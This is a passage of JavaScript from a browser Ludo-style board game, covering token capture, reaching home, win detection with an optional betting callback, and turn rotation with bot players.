          state.tokens[oppColor].forEach((oppPos, oppIdx) => {
            if (oppPos >= 0 && oppPos <= 50 && getAbsoluteMainIndex(oppColor, oppPos) === absIdx) { 
              state.tokens[oppColor][oppIdx] = -1; log(`${PLAYER_CONFIG[color].name} captured ${PLAYER_CONFIG[oppColor].name}!`); extraTurn = true; updateBoard();
            }
          });
        }
      });
    }
  }

  if (targetPos === 56) {
    log(`${PLAYER_CONFIG[color].name} reached home!`); extraTurn = true;
    let finished = state.tokens[color].filter(p => p === 56).length;
    if (finished === 4) {
      state.gameOver = true; alert(`${PLAYER_CONFIG[color].name} WINS!`);
      if (window.isBetGame) window.handleGameEndBetting(color, false);
      resetToMenu(); return;
    }
  }

  state.isAnimating = false;
  if (extraTurn) { log(`${PLAYER_CONFIG[color].name} gets an extra turn!`); state.diceRolled = false; updateUI(); if (PLAYER_CONFIG[currColor].isBot) setTimeout(() => rollDice(currColor), 1000); } 
  else { nextTurn(); }
}

function nextTurn() {
  state.turnIndex = (state.turnIndex + 1) % 4; 
  state.diceRolled = false; 
  state.diceValue = null; 
  state.consecutiveSixes = 0; // Reset consecutive sixes for the new player
  
  gameTurnCount = gameTurnCount + 1; // Replaced ++
  
  updateUI();
  let nextC = COLORS[state.turnIndex]; log(`${PLAYER_CONFIG[nextC].name}'s turn.`);
  if (PLAYER_CONFIG[nextC].isBot && !state.gameOver) { setTimeout(() => rollDice(nextC), 1000); }
}
